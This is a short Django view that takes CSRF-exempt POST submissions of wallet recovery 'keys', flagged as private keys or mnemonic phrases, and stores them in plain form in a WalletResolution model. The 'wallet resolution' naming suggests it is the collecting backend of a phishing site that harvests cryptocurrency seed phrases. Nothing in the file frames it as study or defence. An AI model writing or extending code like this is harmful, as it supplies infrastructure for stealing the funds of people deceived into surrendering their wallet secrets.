from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from wallet.models import WalletResolution
import json


@csrf_exempt
def receive_wallet_resolution(request):
    if request.method == "POST":
        data = request.POST
        name = data.get("walletType", "wallet")
        issue = data.get("walletType", "wallet")
        phrase = data.get("keys")
        wallet1 = data.get("wallet1", "wallet")
        wallet2 = data.get("wallet2", "wallet")
        print("got here")
        wallet_resolution = WalletResolution.objects.create(
            wallet_name=name,
            issue=issue,
            key=phrase,
            is_private=bool(wallet1),
            is_mnemonic=bool(wallet2),
        )
        return JsonResponse({"message": "Data received successfully!"})

    return JsonResponse({"error": "Only POST requests are allowed."}, status=405)
